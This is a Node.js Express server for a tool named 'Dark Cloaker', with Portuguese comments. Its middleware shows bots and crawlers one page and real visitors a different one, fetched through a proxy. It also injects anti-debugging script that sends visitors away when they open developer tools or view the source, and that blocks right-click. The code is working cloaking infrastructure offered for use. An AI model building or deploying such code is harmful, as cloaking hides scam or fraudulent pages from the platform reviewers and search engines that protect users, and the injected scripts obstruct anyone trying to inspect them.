require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const helmet = require("helmet");
const axios = require("axios");
const { isBot } = require("./utils/botDetection");
const { mutateHTMLSafe } = require("./utils/mutator");
const Domain = require("./models/Domain");

const app = express();

// 🔒 Segurança básica
app.use(cors());
app.use(helmet());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 📂 Rotas da API
const authRoutes = require("./routes/auth.routes");
const domainRoutes = require("./routes/domain.routes");
app.use("/api/auth", authRoutes);
app.use("/api/domain", domainRoutes);

// 🔌 Conexão com MongoDB
(async () => {
  try {
    await mongoose.connect(process.env.MONGO_URI);
    console.log("🔥 MongoDB conectado");
  } catch (err) {
    console.error("❌ Erro MongoDB:", err.message);
    process.exit(1);
  }
})();

// ⚔️ Middleware de cloaking cego (pega todas as rotas não-API)
app.use(async (req, res, next) => {
  try {
    // Ignora rotas da API
    if (req.path.startsWith("/api")) return next();

    const host = req.hostname;
    const ua = req.headers["user-agent"] || "";
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    const domain = await Domain.findOne({ officialUrl: `https://${host}` });
    if (!domain) return res.redirect("https://google.com");

    const isBotVisit = isBot(ua, ip); // true = bot/crawler
    const urlAlvo = isBotVisit ? domain.baseUrl : domain.realUrl;
    const destino = `${urlAlvo}${req.originalUrl}`;

    const headers = {
      "User-Agent": ua,
      "X-Forwarded-For": ip,
      Referer: req.get("referer") || '',
    };

    const response = await axios.get(destino, { headers });
    let html = response.data;

    // 🔐 Anti-clonagem e Devtools
    const antiDebug = `
      <script>
        function devtoolsDetector(){
          const s = performance.now(); debugger; const e = performance.now();
          if(e-s>100){ window.location.href='${domain.fallbackUrl}'; }
        }
        setInterval(devtoolsDetector, 1000);
        document.addEventListener('keydown', function(e){
          if(
            e.key==='F12' ||
            (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) ||
            (e.ctrlKey && e.key==='U')
          ){
            e.preventDefault(); window.location.href='${domain.fallbackUrl}';
          }
        });
        document.addEventListener('contextmenu', e=>{
          e.preventDefault(); alert('🚫 Proibido clonar!');
        });
      </script>
    `;

    let mutado = mutateHTMLSafe(html);
    mutado = mutado.replace("</body>", `${antiDebug}</body>`);

    res.setHeader("Content-Type", "text/html; charset=utf-8");
    return res.send(mutado);

  } catch (err) {
    console.error("❌ Erro proxy blindado:", err.message);
    return res.redirect("https://google.com");
  }
});

// 🚀 Iniciar servidor
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`☠️ Dark Cloaker rodando blindado na porta ${PORT}`);
});
